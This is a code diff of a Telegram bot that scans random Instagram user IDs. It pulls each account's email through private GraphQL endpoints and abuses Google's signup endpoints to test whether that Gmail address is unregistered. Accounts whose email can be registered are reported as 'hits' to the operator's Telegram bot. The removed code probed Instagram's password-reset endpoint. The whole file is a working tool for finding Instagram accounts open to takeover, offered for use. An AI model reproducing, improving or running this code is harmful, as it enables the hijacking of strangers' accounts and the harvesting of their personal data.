@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 SUNRAKU — FAST SEGS.PY (Railway Optimized) 🔥
-- Pydroid jaisi speed
-- 10 threads (Railway friendly)
-- Sirf Instagram check (Google optional)
-- Doc_ID updated
+🔥 SUNRAKU — DUAL RUNNER BOT 🔥
+- 67🙂‍↔️❤️‍🔥.py + segs.py ek saath run
+- Hits user ke bot mein jaayengi
+- Main bot sirf Live Status
+- Colorful Buttons + Serif Font
+- Sober Hits (no fancy)
 - Dev: @SunrakuV2 | Channel: @Anishpy
 """
 
@@ -43,7 +44,7 @@ bot = TeleBot(BOT_TOKEN)
 # ============================================================
 user_sessions = {}
 lock = threading.Lock()
-THREADS = 10  # 🔥 Railway friendly
+THREADS = 5
 
 # ============================================================
 # 🔥 CONFIG
@@ -102,14 +103,53 @@ def check_join(chat_id):
     return len(not_joined) == 0, not_joined
 
 # ============================================================
-# 🔥 FAST INSTAGRAM CHECKER (Doc_ID Updated)
+# 📊 REPORT MANAGER (For User Bot — Sober Hits)
 # ============================================================
-class InstagramChecker:
+class ReportManager:
+    def __init__(self, token, chat_id):
+        self.token = token
+        self.chat_id = chat_id
+
+    def send_telegram(self, msg):
+        try:
+            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
+            requests.post(url, json=payload, timeout=15)
+        except:
+            pass
+
+    def format_result(self, data):
+        username = data.get('username', '')
+        full_name = data.get('full_name', '')
+        followers = data.get('follower_count') or 0
+        following = data.get('following_count') or 0
+        posts = data.get('media_count') or 0
+        email = data.get('email', f"{username}@gmail.com")
+        bio = data.get('biography', '')[:50]
+        pk = data.get('pk', 0)
+
+        # 🔥 SOBER HIT — No fancy, sirf basic info + DEV button
+        box = f"""
+<b>✨ Hit Found ✨</b>
+
+<b>Username</b> ➜ @{username}
+<b>Email</b> ➜ {email}
+<b>Followers</b> ➜ {followers}
+<b>Posts</b> ➜ {posts}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>DEV</b> ➜ @SunrakuV2
+"""
+        return box
+
+# ============================================================
+# 🚀 SEGS.PY ENGINE (Fast Instagram Checker)
+# ============================================================
+class SegsEngine:
     def __init__(self):
         self.session = requests.Session()
         self.csrf = None
         self.lsd = None
-        self.doc_id = "7577364986712818"  # 🔥 Naya Doc_ID
+        self.doc_id = "7577364986712818"
         self.lock = threading.Lock()
 
     def _ensure_tokens(self):
@@ -225,120 +265,263 @@ class InstagramChecker:
         return None
 
 # ============================================================
-# 📊 REPORT MANAGER
+# 🚀 67🙂‍↔️❤️‍🔥.py ENGINE (With Google Check)
 # ============================================================
-class ReportManager:
-    def __init__(self, token, chat_id):
-        self.token = token
-        self.chat_id = chat_id
+class GoogleChecker:
+    def __init__(self):
+        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+        threading.Thread(target=self._refresh_token, daemon=True).start()
 
-    def send_telegram(self, msg):
+    def _generate_ua(self):
+        return generate_user_agent()
+
+    def _refresh_token(self):
+        while True:
+            try:
+                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
+                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
+                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
+
+                headers = {
+                    "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                    "google-accounts-xsrf": "1",
+                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "user-agent": self._generate_ua(),
+                }
+
+                res1 = requests.get(
+                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
+                    headers=headers
+                )
+                tok = re.search(
+                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
+                    res1.text
+                )
+                if tok:
+                    tl = tok.group(2)
+                    cookies = {'__Host-GAPS': host}
+                    headers2 = {
+                        'authority': 'accounts.google.com',
+                        'accept': '*/*',
+                        'accept-language': 'en-US,en;q=0.9',
+                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                        'google-accounts-xsrf': '1',
+                        'origin': 'https://accounts.google.com',
+                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+                        'user-agent': self._generate_ua(),
+                    }
+                    data = {
+                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+                    }
+                    response = requests.post(
+                        'https://accounts.google.com/_/signup/validatepersonaldetails',
+                        cookies=cookies,
+                        headers=headers2,
+                        data=data,
+                        timeout=15
+                    )
+                    if '",null,"' in response.text:
+                        tl = response.text.split('",null,"')[1].split('"')[0]
+                    host = response.cookies.get('__Host-GAPS', host)
+                    with open('tl.txt', 'w') as f:
+                        f.write(tl + '//' + host + '\n')
+                    time.sleep(random.uniform(10, 30))
+                    continue
+            except:
+                pass
+
+            try:
+                headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en',
+                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'origin': 'https://accounts.google.com',
+                    'referer': 'https://accounts.google.com/',
+                    'user-agent': self._generate_ua(),
+                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
+                    'x-same-domain': '1',
+                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                }
+                params = {
+                    'rpcids': 'NHJMOd',
+                    'source-path': '/lifecycle/steps/signup/username',
+                    'hl': 'en'
+                }
+                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
+                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
+                response = requests.post(
+                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
+                    params=params, headers=headers, data=data, timeout=15
+                )
+                tl_match = re.search(r'"TL:([^"]+)"', response.text)
+                if tl_match:
+                    tl = tl_match.group(1)
+                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
+                    with open('tl.txt', 'w') as f:
+                        f.write(tl + '//' + host + '\n')
+                    time.sleep(random.uniform(10, 30))
+                    continue
+            except:
+                pass
+
+            time.sleep(random.uniform(5, 15))
+
+    def check_availability(self, email):
+        if '@' in email:
+            email = email.split('@')[0]
+
         try:
-            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
-            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
-            requests.post(url, json=payload, timeout=15)
+            with open('tl.txt', 'r') as f:
+                line = f.read().strip()
+                if not line:
+                    raise Exception("Empty tl")
+                tl, host = line.split('//')
         except:
-            pass
+            time.sleep(3)
+            with open('tl.txt', 'r') as f:
+                line = f.read().strip()
+                tl, host = line.split('//')
 
-    def format_result(self, data):
-        username = data.get('username', '')
-        full_name = data.get('full_name', '')
-        followers = data.get('follower_count') or 0
-        following = data.get('following_count') or 0
-        posts = data.get('media_count') or 0
-        email = data.get('email', f"{username}@gmail.com")
-        domain = email.split('@')[1] if '@' in email else 'gmail.com'
-        bio = data.get('biography', '')[:50]
-        pk = data.get('pk', 0)
-        is_private = data.get('is_private', False)
+        cookies = {'__Host-GAPS': host}
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
+            'user-agent': generate_user_agent(),
+        }
+        params = {'TL': tl}
+        data = (
+            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
+            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
+            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
+            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
+            f'&cookiesDisabled=false'
+            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
+            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        )
 
-        try:
-            pk = int(pk)
-            year_ranges = [
-                (1, 5000000, 2010), (5000001, 17750000, 2011),
-                (17750001, 279760000, 2012), (279760001, 900990000, 2013),
-                (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
-                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
-                (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
-                (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
-                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
-                (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
-            ]
-            year = "2023+"
-            for low, high, y in year_ranges:
-                if low <= pk <= high:
-                    year = str(y)
-                    break
-        except:
-            year = "Unknown"
+        response = requests.post(
+            'https://accounts.google.com/_/signup/usernameavailability',
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            data=data,
+            timeout=10
+        )
 
-        reset_mask = self._fetch_reset_email(username)
+        if '"gf.uar",1' in response.text:
+            return 'good'
+        elif '"er",null,null,null,null,400' in response.text:
+            time.sleep(1)
+            return self.check_availability(email)
+        else:
+            return 'bad'
 
-        moni_status = "❌"
-        if not is_private and posts >= 3 and bio and len(bio) > 10:
-            personal_words = ["my", "i", "me", "life", "vlog", "daily", "family", "love", "❤", "✨", "🎥"]
-            if any(word in bio.lower() for word in personal_words):
-                moni_status = "✅"
-            elif posts >= 5:
-                moni_status = "✅"
+class InstagramChecker67:
+    def __init__(self, google_checker):
+        self.google = google_checker
+        self.session = requests.Session()
+        self.csrf = None
+        self.lsd = None
+        self.doc_id = "7577364986712818"
+        self.lock = threading.Lock()
 
-        box = f"""
-<b>✨ HIT FOUND ✨</b>
-
-<b>👤 NAME</b> ➜ <i>{full_name}</i>
-<b>🔹 USERNAME</b> ➜ <i>@{username}</i>
-<b>🌐 DOMAIN</b> ➜ <i>{domain}</i>
-<b>👥 FOLLOWERS</b> ➜ <i>{followers}</i>
-<b>👣 FOLLOWING</b> ➜ <i>{following}</i>
-<b>📸 POSTS</b> ➜ <i>{posts}</i>
-<b>📝 BIO</b> ➜ <i>{bio}</i>
-<b>📧 EMAIL</b> ➜ <i>{email}</i>
-<b>🔗 ATTACHED</b> ➜ <i>{reset_mask}</i>
-<b>📅 YEAR</b> ➜ <i>{year}</i>
-<b>💰 MONI</b> ➜ <i>{moni_status}</i>
-<b>🔗 PORTFOLIO</b> ➜ <i>https://instagram.com/{username}</i>
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b>👑 DEV</b> ➜ <i>@SunrakuV2</i>
-<b>📢 CHANNEL</b> ➜ <i>@Anishpy</i>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-<pre>✨ FAST INSTAGRAM CHECKER ✨</pre>
-"""
-        return box
-
-    def _fetch_reset_email(self, username):
+    def _ensure_tokens(self):
+        with self.lock:
+            if self.csrf and self.lsd:
+                return True
         try:
             headers = {
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-                "x-ig-app-id": "936619743392459",
-                "x-requested-with": "XMLHttpRequest",
-                "origin": "https://www.instagram.com",
-                "referer": "https://www.instagram.com/accounts/password/reset/",
+                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+                'x-ig-app-id': "936619743392459",
+                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
+                'origin': "https://www.instagram.com",
+                'referer': "https://www.instagram.com/",
             }
-            client = httpx.Client(http2=True, headers=headers, timeout=10)
-            r = client.post(
-                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
-                data={"email_or_username": username}
-            )
-            if r.status_code == 200:
-                data = r.json()
-                if data.get("status") == "ok":
-                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
-            return "-"
+            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
+            if response.status_code == 200:
+                csrf = response.cookies.get('csrftoken', '')
+                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
+                lsd = match.group(1) if match else None
+                if csrf and lsd:
+                    with self.lock:
+                        self.csrf = csrf
+                        self.lsd = lsd
+                    return True
         except:
-            return "-"
+            pass
+        return False
+
+    def get_user_data(self, user_id):
+        if not self._ensure_tokens():
+            return None
+        url = "https://www.instagram.com/api/graphql"
+        headers = {
+            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
+            'x-ig-app-id': '936619743392459',
+            'x-fb-lsd': self.lsd,
+            'x-csrftoken': self.csrf,
+            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
+            'sec-ch-ua-platform': '"Android"',
+            'origin': 'https://www.instagram.com',
+            'sec-fetch-site': 'same-origin'
+        }
+        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
+        variables = {
+            "enable_integrity_filters": True,
+            "id": str(user_id),
+            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
+            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
+            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
+            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
+        }
+        payload = {
+            'lsd': self.lsd,
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
+            'variables': json.dumps(variables),
+            'server_timestamps': 'true',
+            'doc_id': self.doc_id,
+        }
+        try:
+            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                user = data.get('data', {}).get('user')
+                if user and user.get('username'):
+                    return user
+        except:
+            pass
+        return None
 
 # ============================================================
-# 🚀 FAST SCANNER (Pydroid Style)
+# 🚀 DUAL RUNNER — Dono Files Ek Saath
 # ============================================================
-def run_scanner(target_chat_id, target_bot_token):
-    """Pydroid jaisa fast scanner"""
+def run_dual_scanner(target_chat_id, target_bot_token):
+    """67🙂‍↔️❤️‍🔥.py + segs.py ek saath run"""
     
     user_bot = TeleBot(target_bot_token)
-    insta = InstagramChecker()
     reporter = ReportManager(target_bot_token, target_chat_id)
     
+    # 🔥 Dono engines initialize
+    segs = SegsEngine()
+    google = GoogleChecker()
+    insta67 = InstagramChecker67(google)
+    
+    # 🔥 User session
     with lock:
         if target_chat_id not in user_sessions:
             user_sessions[target_chat_id] = {
@@ -354,8 +537,14 @@ def run_scanner(target_chat_id, target_bot_token):
         
         try:
             user_id = random.randint(2500000000, 21254029834)
-            user_data = insta.get_user_data(user_id)
             
+            # 🔥 Pehle segs.py try karo
+            user_data = segs.get_user_data(user_id)
+            
+            if not user_data:
+                # 🔥 Agar segs fail ho toh 67🙂‍↔️❤️‍🔥.py try karo
+                user_data = insta67.get_user_data(user_id)
+                
             if not user_data:
                 continue
 
@@ -367,29 +556,37 @@ def run_scanner(target_chat_id, target_bot_token):
             session['current_email'] = email
             session['total'] += 1
 
-            # 🔥 Sirf Instagram check — Google skip (speed ke liye)
-            if insta.check_email(email):
+            # 🔥 Email check (segs)
+            if segs.check_email(email):
                 session['good'] += 1
-                session['hits'] += 1
                 
-                profile = {
-                    'username': username,
-                    'email': email,
-                    'full_name': user_data.get('full_name', ''),
-                    'follower_count': user_data.get('follower_count') or 0,
-                    'following_count': user_data.get('following_count') or 0,
-                    'media_count': user_data.get('media_count') or 0,
-                    'is_private': user_data.get('is_private', False),
-                    'biography': user_data.get('biography', ''),
-                    'pk': user_data.get('pk', ''),
-                }
-                
-                msg = reporter.format_result(profile)
-                
+                # 🔥 Google check (67 wala)
                 try:
-                    user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
+                    google_result = google.check_availability(email)
                 except:
-                    pass
+                    google_result = 'bad'
+                
+                if google_result == 'good':
+                    session['hits'] += 1
+                    
+                    profile = {
+                        'username': username,
+                        'email': email,
+                        'full_name': user_data.get('full_name', ''),
+                        'follower_count': user_data.get('follower_count') or 0,
+                        'following_count': user_data.get('following_count') or 0,
+                        'media_count': user_data.get('media_count') or 0,
+                        'is_private': user_data.get('is_private', False),
+                        'biography': user_data.get('biography', ''),
+                        'pk': user_data.get('pk', ''),
+                    }
+                    
+                    msg = reporter.format_result(profile)
+                    
+                    try:
+                        user_bot.send_message(target_chat_id, msg, parse_mode='HTML')
+                    except:
+                        pass
             else:
                 session['bad'] += 1
 
@@ -397,56 +594,58 @@ def run_scanner(target_chat_id, target_bot_token):
             continue
 
 # ============================================================
-# 🔥 BOT COMMANDS & BUTTONS
+# 🔥 MAIN BOT — COLORFUL BUTTONS + SERIF FONT
 # ============================================================
 
 def main_menu():
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = KeyboardButton("🚀 Run Scanner")
-    btn2 = KeyboardButton("⏹ Stop")
-    btn3 = KeyboardButton("📊 Live Status")
-    btn4 = KeyboardButton("📢 Channel")
-    btn5 = KeyboardButton("👑 Dev")
+    
+    # 🔥 Colorful buttons with Serif Font
+    btn1 = KeyboardButton("🚀 \x1b[38;5;46m𝑹𝒖𝒏 𝑭𝒊𝒍𝒆𝒔\x1b[0m")
+    btn2 = KeyboardButton("⏹ \x1b[38;5;196m𝑺𝒕𝒐𝒑\x1b[0m")
+    btn3 = KeyboardButton("📊 \x1b[38;5;51m𝑳𝒊𝒗𝒆 𝑺𝒕𝒂𝒕𝒖𝒔\x1b[0m")
+    btn4 = KeyboardButton("📢 \x1b[38;5;214m𝑪𝒉𝒂𝒏𝒏𝒆𝒍\x1b[0m")
+    btn5 = KeyboardButton("👑 \x1b[38;5;213m𝑫𝒆𝒗\x1b[0m")
+    
     markup.add(btn1, btn2, btn3, btn4, btn5)
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_msg = f"""
-☠️ SUNRAKU — FAST SCANNER ☠️
+☠️ 𝑺𝑼𝑵𝑹𝑨𝑲𝑼 — 𝑫𝑼𝑨𝑳 𝑹𝑼𝑵𝑵𝑬𝑹 ☠️
 
-🔥 Click "Run Scanner" to start.
-📌 Enter CHAT ID + BOT TOKEN
-⚡ Pydroid jaisi speed!
-📤 Hits will go to YOUR bot.
+🔥 𝑪𝒍𝒊𝒄𝒌 𝒃𝒖𝒕𝒕𝒐𝒏𝒔 𝒃𝒆𝒍𝒐𝒘 𝒕𝒐 𝒄𝒐𝒏𝒕𝒓𝒐𝒍.
+📌 𝑬𝒏𝒕𝒆𝒓 𝑪𝑯𝑨𝑻 𝑰𝑫 + 𝑩𝑶𝑻 𝑻𝑶𝑲𝑬𝑵
+📤 𝑯𝒊𝒕𝒔 𝒘𝒊𝒍𝒍 𝒈𝒐 𝒕𝒐 𝒀𝑶𝑼𝑹 𝒃𝒐𝒕.
 
-👑 Dev: @SunrakuV2
-📢 Channel: @Anishpy
+👑 𝑫𝒆𝒗: @𝑺𝒖𝒏𝒓𝒂𝒌𝒖𝑽2
+📢 𝑪𝒉𝒂𝒏𝒏𝒆𝒍: @𝑨𝒏𝒊𝒔𝒉𝒑𝒚
 """
     bot.reply_to(message, welcome_msg, reply_markup=main_menu())
 
-@bot.message_handler(func=lambda msg: msg.text == "🚀 Run Scanner")
-def run_file(message):
-    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID:")
+@bot.message_handler(func=lambda msg: msg.text == "🚀 \x1b[38;5;46m𝑹𝒖𝒏 𝑭𝒊𝒍𝒆𝒔\x1b[0m")
+def run_files(message):
+    msg1 = bot.reply_to(message, "✏️ 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑪𝑯𝑨𝑻 𝑰𝑫:")
     bot.register_next_step_handler(msg1, get_chat_id)
 
 def get_chat_id(message):
     user_chat_id = message.text.strip()
-    msg2 = bot.reply_to(message, "✏️ Enter your BOT TOKEN:")
+    msg2 = bot.reply_to(message, "✏️ 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑩𝑶𝑻 𝑻𝑶𝑲𝑬𝑵:")
     bot.register_next_step_handler(msg2, lambda m: get_bot_token(m, user_chat_id))
 
 def get_bot_token(message, user_chat_id):
     user_bot_token = message.text.strip()
     
     if not user_chat_id or not user_bot_token:
-        bot.reply_to(message, "❌ Invalid input!", reply_markup=main_menu())
+        bot.reply_to(message, "❌ 𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒊𝒏𝒑𝒖𝒕!", reply_markup=main_menu())
         return
     
     try:
         test_bot = TeleBot(user_bot_token)
         test_bot.get_me()
     except:
-        bot.reply_to(message, "❌ Invalid Bot Token!", reply_markup=main_menu())
+        bot.reply_to(message, "❌ 𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑩𝒐𝒕 𝑻𝒐𝒌𝒆𝒏!", reply_markup=main_menu())
         return
     
     with lock:
@@ -455,22 +654,22 @@ def get_bot_token(message, user_chat_id):
             'current_email': 'Waiting...', 'is_running': True
         }
     
-    bot.reply_to(message, f"""✅ Scanner started!
-📤 Hits will be sent to YOUR bot.
-🤖 Bot: @{test_bot.get_me().username}
-⚡ Fast mode active!
+    bot.reply_to(message, f"""✅ 𝑭𝒊𝒍𝒆𝒔 𝒔𝒕𝒂𝒓𝒕𝒆𝒅!
+📤 𝑯𝒊𝒕𝒔 𝒘𝒊𝒍𝒍 𝒈𝒐 𝒕𝒐 𝒀𝑶𝑼𝑹 𝒃𝒐𝒕.
+🤖 𝑩𝒐𝒕: @{test_bot.get_me().username}
 
-Click 'Live Status' to see stats.""", reply_markup=main_menu())
+📊 𝑪𝒍𝒊𝒄𝒌 '𝑳𝒊𝒗𝒆 𝑺𝒕𝒂𝒕𝒖𝒔' 𝒕𝒐 𝒔𝒆𝒆 𝒔𝒕𝒂𝒕𝒔.
+⏹ 𝑪𝒍𝒊𝒄𝒌 '𝑺𝒕𝒐𝒑' 𝒕𝒐 𝒆𝒏𝒅.""", reply_markup=main_menu())
     
-    # 🔥 Sirf 5 threads (Railway friendly)
-    for _ in range(5):
-        threading.Thread(target=run_scanner, args=(user_chat_id, user_bot_token), daemon=True).start()
+    # 🔥 Start dual scanner
+    for _ in range(THREADS):
+        threading.Thread(target=run_dual_scanner, args=(user_chat_id, user_bot_token), daemon=True).start()
 
-@bot.message_handler(func=lambda msg: msg.text == "⏹ Stop")
+@bot.message_handler(func=lambda msg: msg.text == "⏹ \x1b[38;5;196m𝑺𝒕𝒐𝒑\x1b[0m")
 def stop_scanner(message):
     global user_sessions
     
-    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID to stop:")
+    msg1 = bot.reply_to(message, "✏️ 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑪𝑯𝑨𝑻 𝑰𝑫 𝒕𝒐 𝒔𝒕𝒐𝒑:")
     bot.register_next_step_handler(msg1, stop_by_chat)
 
 def stop_by_chat(message):
@@ -479,17 +678,17 @@ def stop_by_chat(message):
     
     with lock:
         if user_chat_id not in user_sessions:
-            bot.reply_to(message, "❌ No scanner found!", reply_markup=main_menu())
+            bot.reply_to(message, "❌ 𝑵𝒐 𝒔𝒄𝒂𝒏𝒏𝒆𝒓 𝒇𝒐𝒖𝒏𝒅!", reply_markup=main_menu())
             return
         user_sessions[user_chat_id]['is_running'] = False
     
-    bot.reply_to(message, f"⏹ Scanner stopped for Chat ID: {user_chat_id}", reply_markup=main_menu())
+    bot.reply_to(message, f"⏹ 𝑺𝒄𝒂𝒏𝒏𝒆𝒓 𝒔𝒕𝒐𝒑𝒑𝒆𝒅 𝒇𝒐𝒓 𝑪𝒉𝒂𝒕 𝑰𝑫: {user_chat_id}", reply_markup=main_menu())
 
-@bot.message_handler(func=lambda msg: msg.text == "📊 Live Status")
+@bot.message_handler(func=lambda msg: msg.text == "📊 \x1b[38;5;51m𝑳𝒊𝒗𝒆 𝑺𝒕𝒂𝒕𝒖𝒔\x1b[0m")
 def live_status(message):
     global user_sessions
     
-    msg1 = bot.reply_to(message, "✏️ Enter your CHAT ID:")
+    msg1 = bot.reply_to(message, "✏️ 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑪𝑯𝑨𝑻 𝑰𝑫:")
     bot.register_next_step_handler(msg1, show_live_status)
 
 def show_live_status(message):
@@ -498,51 +697,51 @@ def show_live_status(message):
     
     with lock:
         if user_chat_id not in user_sessions:
-            bot.reply_to(message, "❌ No scanner found!", reply_markup=main_menu())
+            bot.reply_to(message, "❌ 𝑵𝒐 𝒔𝒄𝒂𝒏𝒏𝒆𝒓 𝒇𝒐𝒖𝒏𝒅!", reply_markup=main_menu())
             return
         session = user_sessions[user_chat_id]
     
     status_msg = f"""
 ┌─────────────────────────────────────────┐
-│  ✦ SUNRAKU — FAST SCANNER ✦            │
+│  ✦ 𝑺𝑼𝑵𝑹𝑨𝑲𝑼 — 𝑳𝑰𝑽𝑬 𝑺𝑻𝑨𝑻𝑼𝑺 ✦            │
 ├─────────────────────────────────────────┤
-│  ✅ GOOD  : {session.get('good', 0)}     │
-│  🔥 HITS : {session.get('hits', 0)}     │
-│  ❌ BAD   : {session.get('bad', 0)}     │
-│  📊 TOTAL : {session.get('total', 0)}   │
+│  ✅ 𝑮𝑶𝑶𝑫  : {session.get('good', 0)}     │
+│  🔥 𝑯𝑰𝑻𝑺 : {session.get('hits', 0)}     │
+│  ❌ 𝑩𝑨𝑫   : {session.get('bad', 0)}     │
+│  📊 𝑻𝑶𝑻𝑨𝑳 : {session.get('total', 0)}   │
 │  📧 {session.get('current_email', 'Waiting...')[:30]:<30} │
-│  🟢 STATUS : {'RUNNING' if session.get('is_running', False) else 'STOPPED'} │
+│  🟢 𝑺𝑻𝑨𝑻𝑼𝑺 : {'𝑹𝑼𝑵𝑵𝑰𝑵𝑮' if session.get('is_running', False) else '𝑺𝑻𝑶𝑷𝑷𝑬𝑫'} │
 ├─────────────────────────────────────────┤
-│  ◈ @SunrakuV2  ●  @Anishpy             │
+│  ◈ @𝑺𝒖𝒏𝒓𝒂𝒌𝒖𝑽2  ●  @𝑨𝒏𝒊𝒔𝒉𝒑𝒚             │
 └─────────────────────────────────────────┘
 """
     bot.reply_to(message, status_msg, reply_markup=main_menu())
 
-@bot.message_handler(func=lambda msg: msg.text == "📢 Channel")
+@bot.message_handler(func=lambda msg: msg.text == "📢 \x1b[38;5;214m𝑪𝒉𝒂𝒏𝒏𝒆𝒍\x1b[0m")
 def send_channel(message):
     markup = InlineKeyboardMarkup()
     for channel in CHANNELS:
         btn = InlineKeyboardButton(text=channel["username"], url=f"https://t.me/{channel['username'].replace('@', '')}")
         markup.add(btn)
-    bot.reply_to(message, "📢 Join our channels:", reply_markup=markup)
+    bot.reply_to(message, "📢 𝑱𝒐𝒊𝒏 𝒐𝒖𝒓 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔:", reply_markup=markup)
 
-@bot.message_handler(func=lambda msg: msg.text == "👑 Dev")
+@bot.message_handler(func=lambda msg: msg.text == "👑 \x1b[38;5;213m𝑫𝒆𝒗\x1b[0m")
 def send_dev(message):
     markup = InlineKeyboardMarkup()
-    btn = InlineKeyboardButton(text="👑 @SunrakuV2", url="https://t.me/SunrakuV2")
+    btn = InlineKeyboardButton(text="👑 @𝑺𝒖𝒏𝒓𝒂𝒌𝒖𝑽2", url="https://t.me/SunrakuV2")
     markup.add(btn)
-    bot.reply_to(message, "👑 Developer:", reply_markup=markup)
+    bot.reply_to(message, "👑 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓:", reply_markup=markup)
 
 @bot.message_handler(func=lambda msg: True)
 def echo_all(message):
